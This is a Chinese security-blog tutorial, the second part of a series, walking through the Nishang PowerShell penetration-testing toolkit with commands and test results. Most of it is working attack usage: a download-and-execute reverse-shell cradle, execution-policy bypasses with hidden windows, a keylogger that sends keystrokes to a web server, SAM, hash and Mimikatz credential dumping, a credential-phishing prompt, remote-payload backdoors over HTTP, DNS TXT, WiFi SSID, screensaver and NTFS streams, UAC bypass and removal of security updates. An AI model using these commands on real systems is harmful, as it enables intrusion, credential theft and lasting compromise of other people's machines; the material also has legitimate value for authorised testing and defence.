> 原文链接: https://www.anquanke.com//post/id/84939 


# 【技术分享】Powershell 渗透测试工具-Nishang（二）


                                阅读量   
                                **204622**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t014150d112bea7d3f8.png)](https://p5.ssl.qhimg.com/t014150d112bea7d3f8.png)

****

**作者：**[**V1ct0r**](http://bobao.360.cn/member/contribute?uid=2665001095)

**稿费：500RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**



**传送门**

[**【技术分享】Powershell 渗透测试工具-Nishang（一）**](http://bobao.360.cn/learning/detail/3182.html)

**<br>**

**0x00 介绍**

Powershell用于渗透测试其实早在多年前就已经被提出了。利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，并且相较已经被大家广泛关注并防御的Cmd而言，Powershell并非那么的引人瞩目。Nishang是基于PowerShell的渗透测试专用工具。它集成了框架、脚本和各种payload，能够帮助渗透测试人员在对Windows目标的全过程检测中使用，是一款来源于作者实战经历的智慧结晶。至今，Nishang最新版本已为v0.67了。本文我将具体介绍这款实用的Powershell渗透测试工具。

<br>

**0x01 使用**

要使用Nishang，我们首先需要在[[作者的Github]](https://github.com/samratashok/nishang)上面下载它，之后加载这些脚本。 

Nishang需要我们的Powershell版本在v3以上才能使用，这里顺便提供两种查看当前我们当前Powershell版本的方法: 

**1.直接在我们的Powershell下执行”get-host”命令： **

[![](https://p2.ssl.qhimg.com/t01968fe43017bd6791.jpg)](https://p2.ssl.qhimg.com/t01968fe43017bd6791.jpg)

**2.我们还可以在Powershell下执行”$PSVersionTable.PSVersion”： **

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0136d6c6de72d96888.jpg)

需要知道的是：



```
默认情况下的Server OS 对应的 Powershell的版本：
Windows 2008 R2   -   Version 2
Windows 2012      -   Version 3
Windows 2012 R2   -   Version 4
Windows 2016      -   Version 5
```

现在我们需要加载我们的脚本：

```
PS D:nishang-master&gt; Import-Module .nishang.psm1
```

你可能会遇到下面的问题： 

[![](https://p0.ssl.qhimg.com/t01f26d6b3b94f6a287.jpg)](https://p0.ssl.qhimg.com/t01f26d6b3b94f6a287.jpg)

这是因为我们Powershell的默认的执行策略是Restricted的，而Restricted是不允许任何脚本运行的，我们可以使用下面的命令来来查看当前的执行策略：

```
PS D:nishang-master&gt; Get-ExecutionPolicy
```

这里我们需要将执行模式改为RemoteSigned，这样就可以执行其他用户的脚本了：

```
PS D:nishang-master&gt; set-executionpolicy remotesigned //这需要在管理员的状态下执行
```

现在，我们就可以正常进行加载了。 

当然，上面是基于我们在本地进行测试的情况下，如果是在真实的攻击场景之下，我们还是不宜去做一些全局策略的更改的，这里简单推荐几个Bypass执行策略的Tricks：



```
0. Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted //设置当前用户的执行策略为Unrestricted，也算是去更改了当前的全局策略
1. powershell.exe -executionpolicy bypass -Windowstyle hidden -noninteractive -nologo -File //或是下面这种，-Windowstyle hidden 可以让我们的执行无任何弹窗
2. PowerShell.exe -ExecutionPolicy Bypass -File
```

想了解更多姿势，大家可以看看Bypass执行策略的十五种方法： 

[https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

然后，我们使用Dot Sourcing的方式来加载独立的脚本：

```
PS D:nishang-master&gt; ."D:nishang-masterGatherGet-Information.ps1"
```

在之后的使用中，我们可以使用”Get-Help”命令来获取当前脚本的用法和说明等，如：



```
PS D:nishang-master&gt; ."D:nishang-masterGatherGet-WLAN-Keys.ps1
PS D:nishang-master&gt; Get-Help Get-Wlan-Keys
```

[![](https://p4.ssl.qhimg.com/t01ad06705f088b92ac.jpg)](https://p4.ssl.qhimg.com/t01ad06705f088b92ac.jpg)

还需要说的一点是，我们可以在Powershell中使用” Out-File”来将我们的执行结果导出到文件中，如：

```
PS D:nishang-master&gt; Get-Information | Out-File res.txt
```

就可以把获取到的信息保存在res.txt中了。 

最后，需要介绍两种在内存当中去加载脚本的方式 

第一种：

```
powershell iex (New-Object Net.WebClient).DownloadString('http:///Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] //
```

这里IEX可以远程下载我们的脚本

第二种，我们可以在Powershell中使用Invoke-Encode脚本来将我们现有的脚本编码压缩，生成编码后的内容，过程如下：



```
PS D:nishang-master&gt; Invoke-Encode -DataToEncode "D:nishang-masterShellsInvoke-PowerShellTcp.ps1" -OutCommand
Encoded data written to .encoded.txt
Encoded command written to .encodedcommand.txt
```

在我们的encodedcommand.txt文件中我们可以看到编码后的内容和效果： 

[![](https://p3.ssl.qhimg.com/t010bb1dc3dd80fad70.jpg)](https://p3.ssl.qhimg.com/t010bb1dc3dd80fad70.jpg)

然后在目标上(Web shell,meterpreter native shell等都可以)使用如下命令执行：

```
C:Userstarget&gt; powershell -e [encodedscript]
```

这里涉及到的Invoke-PowerShellTcp脚本，我们将在后文对于具体模块的脚本介绍时谈到。

<br>

**0x02 模块介绍**

**0.信息搜集**

Check-VM

从这个脚本的名字就可以看出来，它是用于检测当前的机器是否是一台已知的虚拟机的。它通过检测已知的一些虚拟机的指纹信息（如：Hyper-V, VMWare, Virtual PC, Virtual Box,Xen,QEMU）来识别。 

执行方式：

```
PS &gt; Check-VM
```

测试

[![](https://p2.ssl.qhimg.com/t01236745b37285e83b.jpg)](https://p2.ssl.qhimg.com/t01236745b37285e83b.jpg)

Copy-VSS

这个脚本利用Volume Shadow Copy 服务来复制出SAM文件。如果这个脚本运行在了DC机上ntds.dit和SYSTEM hive也能被拷贝出来。 

执行方式：



```
PS &gt; Copy-VSS //将会直接把文件保存在当前路径下
PS &gt; Copy-VSS -DestinationDir C:temp  //指定保存文件的路径（必须是已经存在的路径）
```

测试

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0138c8a7a7976f5293.jpg)

Invoke-CredentialsPhish

这个脚本是用来欺骗用户输入账号密码信息的。 

执行方式：

```
PS &gt; Invoke-CredentialsPhish
```

测试

[![](https://p4.ssl.qhimg.com/t019ccfefe441016dc3.jpg)](https://p4.ssl.qhimg.com/t019ccfefe441016dc3.jpg)

执行后会弹出这个框欺骗用户输入 

直到用户输入正确后这个框才会消失，然后我们就可以得到明文的管理员账号密码：

[![](https://p3.ssl.qhimg.com/t015c212478037bb661.jpg)](https://p3.ssl.qhimg.com/t015c212478037bb661.jpg)

FireBuster FireListener

FireBuster可以对内网进行扫描，它会把包发给FireListener 

执行方式：



```
PS &gt; FireBuster 10.10.10.10 1000-1020
PS &gt; FireListener -portrange 1000-1020
```

该脚本作者的Github上面还提供了一个Python版的监听端： 

[https://github.com/roo7break/PowerShell-Scripts/blob/master/FireBuster/](https://github.com/roo7break/PowerShell-Scripts/blob/master/FireBuster/) 

测试 

我们首先在我们的机器（Attacker）上面运行FireListener：

```
FireListener 100-110
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01bf396dcdcab17102.jpg)

Victim：

```
FireBuster 192.168.199.1 90-110 -Verbose
```

[![](https://p1.ssl.qhimg.com/t017fd490758d1b93f0.jpg)](https://p1.ssl.qhimg.com/t017fd490758d1b93f0.jpg)

Get-Information

这个脚本可以获取目标机器上大量的信息（FTP访问，进程，计算机配置信息，无线网络和设备的信息，Hosts信息等等非超丰富）。 

执行方式：

```
PS &gt; Get-Information
```

[![](https://p4.ssl.qhimg.com/t01f25be5baee48e1d0.jpg)](https://p4.ssl.qhimg.com/t01f25be5baee48e1d0.jpg)

还可以用我们前面说过的Out-File来将运行结果保存到指定文件。

Get-LSASecret

该脚本可以获取LSA信息，但是使用的前提当然是你已经成功提升了权限的情况下，通常和我们后面提权当中涉及到的Enable-DuplicateToken（帮助我们获得System权限）联合使用。 

执行方式：



```
PS &gt; Enable-DuplicateToken
PS &gt; Get-LsaSecret
PS &gt; Get-LsaSecret -RegistryKey KeyName //还可以指定键名
```

Get-PassHashes

这个脚本在Administrator的权限下，可以dump出密码哈希值。这个脚本来自于msf中powerdump，但做出了修改，使得我们不再需要System权限就可以dump了。 

执行方式：

```
PS &gt; Get-PassHashes -PSObjectFormat //可以使用-PSObjectFormat来格式化输出结果
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014a298b31f2bda3a5.jpg)

Get-WLAN-Keys

在Administrator的权限下，可以利用这个脚本来dump出WLAN文件的密钥信息。实质上，这个脚本就是利用了netsh wlan show profile name=”” key=clear来获取。 

执行方式：

```
PS &gt; Get-WLAN-Keys
```

Keylogger

Keylogger可以保存下用户的键盘记录。 

执行方式：



```
PS &gt; .Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis  //-CheckURL参数会去检查所给出的网页之中是否包含 -MagicString后的字符串，如果存在的话就停止使用记录。
PS &gt; .Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php //将记录指定发送给一个可以记录Post请求的Web服务器
PS &gt; .Keylogger.ps1 -persist //实现持久化记录（重启后依然进行记录）
PS &gt; .Keylogger.ps1 //直接以这种方式来运行，键盘记录会保存在当前用户的Temp目录下key文件中
```

测试 

首先执行 PS &gt; .Keylogger.ps1

[![](https://p4.ssl.qhimg.com/t0125efdaa308e3ef3f.jpg)](https://p4.ssl.qhimg.com/t0125efdaa308e3ef3f.jpg)

发现在当前用户的Temp目录下生成了Key的文件，这时我们使用nishang Utility中的Parse_Keys来解析

```
PS &gt;Parse_Keys .key.log .parsed.txt
```

然后parsed.txt里面就是解析后的按键记录了

[![](https://p2.ssl.qhimg.com/t01032c3b1a764d9750.jpg)](https://p2.ssl.qhimg.com/t01032c3b1a764d9750.jpg)

Invoke-MimikatzWdigestDowngrade

Dump出Windows 8.1 and Server 2012的系统用户密码。 

执行方式：



```
PS &gt;Invoke-MimikatzWDigestDowngrade
PS &gt; Get-Job | Receive-Job
```

执行了

```
PS &gt;Invoke-MimikatzWDigestDowngrade
```

Windows会锁屏

[![](https://p0.ssl.qhimg.com/t01b5ddf5ed38cb4df7.jpg)](https://p0.ssl.qhimg.com/t01b5ddf5ed38cb4df7.jpg)

之后执行

```
Get-Job
```

发现尝试多次都测试失败

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c2a88448dc74541a.jpg)

解决办法可以参考： 

[[域渗透——Dump Clear-Text Password after KB2871997 installed]](http://www.myhack58.com/Article/html/3/62/2016/75903.htm)

Get-PassHints

这个脚本可以从Windows获得用户的密码的提示信息，需要有Administrator的权限来读取SAM hive。 

执行方式：

```
PS &gt; Get-PassHints
```

Show-TargetScreen

使用MJPEG传输目标机器的远程桌面的实时画面，在本机我们可以使用NC或者Powercat来进行监听。在本地使用支持MJPEG的浏览器（如：Firefox）访问本机对应监听端口，即可在浏览器上面看到远端传输回来的实时画面。

```
PS &gt; Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443  //将远程的画面传送到192.168.230.1的443端口
```

测试 

Victim：

```
Show-TargetScreen -IPAddres 192.168.199.127 -Port 5773 -Reverse
```

Attacker：

```
nc.exe -nlvp 5773 | nc.exe -nlvp 9000 //这里我使用的NC，也可以用Powercat
```

本机访问：127.0.0.1:9000

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01852a189eaf71620e.jpg)

Invoke-Mimikatz

Mimikatz大家都非常熟悉了，就不再介绍了 

执行方式：



```
Invoke-Mimikatz -DumpCerts //Dump出本机的凭证信息
Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2") //Dump出远程两台计算机的凭证信息
Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1" //在远程一台机器上运行Mimikatz并执行"privilege::debug exit"
```

**1.域相关脚本**

Get-Unconstrained

查找域内开启了Kerberos Unconstrained Delegation的机器。 

执行方式：



```
PS &gt; Get-Unconstrained //返回开启的计算机名
PS &gt; Get-Unconstrained -Details  //返回更详细的信息
```

关于”通过Kerberos Unconstrained Delegation获取到域管理员”： 

[http://www.freebuf.com/articles/terminal/98530.html](http://www.freebuf.com/articles/terminal/98530.html)

**2.Antak Webshell**

Antak

一个ASPX的Webshell，通过这个Webshell可以编码、执行脚本，上传、下载文件。 

[![](https://p3.ssl.qhimg.com/t012e1da54c6c4e3697.png)](https://p3.ssl.qhimg.com/t012e1da54c6c4e3697.png)

执行方式：



```
上传Webshell后把它当成一个正常的Powershell执行窗口来使用
上传和下载文件，只需要填写好对应路径点击上传、下载按钮即可
```

关于Antak Webshell的更多介绍，请参考： 

[http://www.labofapenetrationtester.com/2014/06/introducing-antak.html](http://www.labofapenetrationtester.com/2014/06/introducing-antak.html)

**3.后门**

HTTP-Backdoor

HTTP-Backdoor可以帮助我们在目标机器上下载和执行Powershell脚本 

执行方式：

```
PS &gt; HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis
```

下面解释下几个比较重要的参数：



```
CheckURL 给出一个URL地址，如果存在我们MagicString中的值就去执行Payload - 下载运行我们的脚本
PayloadURL 这个参数给出我们需要下载的Powershell脚本的地址
Arguments 这个参数指定我们要执行的函数
StopString 这个参数也会去看是否存在我们CheckURL返回的字符串，如果存在就会停止执行
```

DNS_TXT_Pwnage

利用DNS隧道来进行信息传输、通信的小技巧已经不少见了。在Nishang中也集成了一个通过DNS TXT来接收命令或者脚本的后门脚本。使用DNS_TXT_Pwnage这个脚本，我们一般需要配合Utility下的Out-DnsTxt使用。 

所以这里首先说下Out-DnsTxt的使用：

```
PS &gt;Out-DnsTxt -DataToEncode path //path处是你想编码的内容的路径
```

之后，它会生成一个编码后的文件，如下图所示

[![](https://p1.ssl.qhimg.com/t01a52d3fa454ec8307.jpg)](https://p1.ssl.qhimg.com/t01a52d3fa454ec8307.jpg)

然后我们去添加对应的TXT记录就行了，encoded.txt文件中每一行为一条记录 

添加完后我们还需要添加两条TXT记录，内容为start和stop 

添加完成后，我们就可以利用DNS_TXT_Pwnage这个脚本了 

执行方式：

```
PS &gt;DNS_TXT_Pwnage -startdomain start.test.com -cmdstring start -commanddomain command.test.com -psstring test -psdomain xxx.test.com -Subdomains 1 -StopString stop
```

具体参数的意思：



```
startdomain 会一直去检测我们指定域名的TXT记录，并把返回的记录与我们输入的cmdstring以及psstring进行比较
cmdstring 是我们任意输入的字符串，如果startdomain与我们这里输入的cmdstring值相等则执行commanddomain命令
commanddomain 创建的执行命令TXT记录的域名
psstring 是我们任意输入的字符串，如果与我们这里输入的psstring值相等则执行psdomain脚本
psdomain 是我们创建的执行脚本TXT记录的域名
Subdomains 是执行脚本创建TXT记录的个数
StopString 是任意输入的字符串，如果这里输入的字符串与startdomain中返回的记录相同将会停止执行我们的Payload
Arguments 指定要执行的函数名
```

Execute-OnTime

执行方式：

```
PS &gt; Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload
```

具体参数的意思：



```
PayloadURL 指定我们脚本下载的地址
Arguments 指定执行的函数名
Time 参数可以设定脚本执行的时间（例如 -Time 23:21）
CheckURL 参数会检测我们一个指定的URL内容是否存在StopString给出的字符串，如果发现了就停止执行
```

Gupt-Backdoor

Gupt-Backdoor这个脚本可以帮助我们通过无线SSID反弹后门和执行命令。 

执行方式：

```
PS &gt;Gupt-Backdoor -MagicString test -Verbose
```

这里解释一下MagicString这个参数： 

MagicString开头的4个字符是用来识别我们建立的WIFI SSID的。例如，这里是test，Gupt后门会去自动匹配我们WIFI中SSID以test开头的。而MagicString这个参数从第五个字符开始就决定了我们是执行命令或是下载脚本。 

需要注意的是：

如果它的第五个字符是c就代表执行命令。 

例如：-MagicString testcwhoami 

就会匹配WIFI SSID为test的，并执行命令whoami

如果它的第五个字符是u的话就代表下载脚本。 

例如：-MagicString testuXXXX 

就会匹配WIFI SSID为test的，并默认下载http://goo.gl/XXXX 

（其中http://goo.gl可在脚本的$PayloadURL参数中修改）

还可以用Arguments参数来指定下载脚本 

例如： 

PS &gt;Gupt-Backdoor -MagicString test -Argument Get-Information -Verbose 

就可以下载Get-Information的脚本了

补充 

Windows下创建一个WIFI：



```
cmd
netsh wlan set hostednetwork mode=allow
netsh wlan set hostednetwork ssid=test key=1234567890
netsh wlan start hostednetwork
```

Add-ScrnSaveBackdoor

这个脚本可以帮助我们利用Windows的屏保来留下一个隐藏的后门 

执行方式：



```
PS &gt;Add-ScrnSaveBackdoor -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process" //使用这条语句可以执行我们自己的Payload
PS &gt;Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/Powerpreter.psm1 -Arguments HTTP-Backdoor 
http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis //利用这条命令可以从powershell执行一个HTTP-Backdoor
PS &gt;Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/code_exec.ps1  //还可以使用msfvenom先生成一个powershell (./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.254.226 -f powershell)，然后利用这条命令返回一个meterpreter
```

其他具体的参数的意思和我们上面介绍的一些后门是类似的



```
PayloadURL 指定我们需要下载的脚本地址
Arguments 指定我们要执行的函数以及相关参数
```

Invoke-ADSBackdoor

这个脚本是使用NTFS数据流留下一个永久性后门。其实，由NTFS数据流带来的一些安全问题的利用并不少见了（如：利用NTFS数据流在Mysql UDF提权中创建lib/plugin目录），大家可以参考《NTFS ADS带来的WEB安全问题》 

这个脚本可以向ADS中注入代码并且以普通用户权限运行 

执行方式：



```
PS &gt;Invoke-ADSBackdoor -PayloadURL http://192.168.254.1/Powerpreter.psm1 -Arguments HTTP-Backdoor "http://pastebin.
com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis
```

这个脚本主要有两个参数，在上面介绍其他后门当中已经说明了，这里是类似的 

需要说明的是，执行后它会在AppData的目录下建立一个ads并把我们的Payload注入进去，如果我们希望在cmd下看到我们这里建立的ads，需要使用：dir /a /r

**4.客户端**

对于这一部分的脚本，我就不再赘述了，因为网上早已经有了对于这一部分脚本的介绍说明： 

使用Powershell Client进行有效钓鱼

**5.权限提升**

Enable-DuplicateToken

这个脚本可以帮助我们在已经获得了一定权限的情况下，使我们提升到System权限。 

执行方式

```
PS &gt; Enable-DuplicateToken
```

具体的相关介绍可以查阅： 

[https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/05/use-powershell-to-duplicate-process-tokens-via-pinvoke/](https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/05/use-powershell-to-duplicate-process-tokens-via-pinvoke/)

Remove-Update

这个脚本可以帮助我们移除系统所有的更新，或所有安全更新，以及指定编号的更新。 

执行方式：



```
PS &gt; Remove-Update All       //移除目标机器上的所有更新
PS &gt; Remove-Update Security  //移除目标机器上所有安全相关更新
PS &gt; Remove-Update KB2761226 //移除指定编号的更新
```

Invoke-PsUACme

Invoke-PsUACme使用了来自于UACME项目的DLL来Bypass UAC。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t011c577722427825d3.jpg)

上表给出了各种UAC绕过的方法，我们可以在Invoke-PsUACme中指定相应方法执行。 

执行方式：



```
PS &gt; Invoke-PsUACme -Verbose //使用Sysprep方法和默认的Payload执行
PS &gt; Invoke-PsUACme -method oobe -Verbose //使用oobe方法和默认的Payload执行
PS &gt; Invoke-PsUACme -method oobe -Payload "powershell -windowstyle hidden -e YourEncodedPayload" //使用-Payload参数可以自行指定要执行的Payload
```

除开以上而外，我们还可以使用-PayloadPath参数来指定Payload的路径，默认情况下Payload会在C:WindowsTempcmd.bat结束。还可以使用-CustomDLL64（64位）或-CustomDLL32（32位）参数来自定义一个DLL文件。

**6.扫描**

Invoke-BruteForce

这个脚本可以对SQL Server、域控制器、Web以及FTP进行口令的爆破 

执行方式：



```
PS &gt; Invoke-BruteForce -ComputerName targetdomain.com -UserList C:testusers.txt -PasswordList C:testwordlist.txt -Service ActiveDirectory -StopOnSuccess -Verbose //爆破域控制器
PS &gt; Invoke-BruteForce -ComputerName SQLServ01 -UserList C:testusers.txt -PasswordList C:testwordlist.txt -Service SQL -Verbose  //爆破SQL Server
PS &gt; cat C:testservers.txt | Invoke-BruteForce -UserList C:testusers.txt -PasswordList C:testwordlist.txt -Service SQL -Verbose  //爆破server.txt中所有servers的SQL Server
```

主要的参数：



```
ComputerName 用于指定对应服务的计算机名
UserList 用户名字典
PasswordList 密码字典
Service 服务类型（注意默认为：SQL）
StopOnSuccess 成功找到一个后就停止执行
```

Invoke-PortScan

利用这个脚本我们可以在目标机器上对内网进行端口扫描 

执行方式：

```
PS &gt;Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort -Port 80
```

主要的参数：



```
StartAddress 扫描范围开始的地址
EndAddress 扫描范围结束的地址
ScanPort 进行端口扫描
Port 指定扫描端口（默认扫描端口：21,22,23,53,69,71,80,98,110,139,111, 
389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901）
TimeOut 设置超时时间
```

**7.中间人**

Invoke-Interceptor

这个脚本可以通过建立一个代理服务器的方式来拦截HTTPS的请求，并将这些请求记录下来 

执行方式：

```
PS &gt;Invoke-Interceptor -ProxyServer 192.168.230.21 -ProxyPort 3128 //这条命令将默认在8081端口监听并把请求发送给上游代理的3128端口
```

可以通过ListenPort来修改我们目标机器上的监听端口（默认8081端口） 

例如 

我们在目标机器上执行：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0170d54794b04910ae.jpg)

然后这里本机我用NC来监听对应端口：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016f90a81040f75025.jpg)

接收到了来自目标机的请求数据 

并且这个脚本会在目标机的TEMP目录下生成interceptor.log的文件来记录请求数据

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0104c6f27a941f1c30.jpg)

<br>

**0x03 结语**

Nishang这款基于PowerShell的渗透测试专用工具集成了非常多实用的脚本与框架，方便我们在渗透测试过程之中使用。尽管，在一些环境下我们可能没有办法去执行Powershell，但是通过查看这些脚本的具体代码，我们也可以自己去完成实现脚本提供的一些功能。限于篇幅，本文只能抛砖引玉地介绍Nishang的部分功能，希望大家能够在实际的应用之中去体验。

**<br>**

**参考**

1. [http://www.labofapenetrationtester.com/](http://www.labofapenetrationtester.com/) 

2. [https://github.com/samratashok/nishang/](https://github.com/samratashok/nishang/)

**<br>**

**传送门**

[**【技术分享】Powershell 渗透测试工具-Nishang（一）**](http://bobao.360.cn/learning/detail/3182.html)


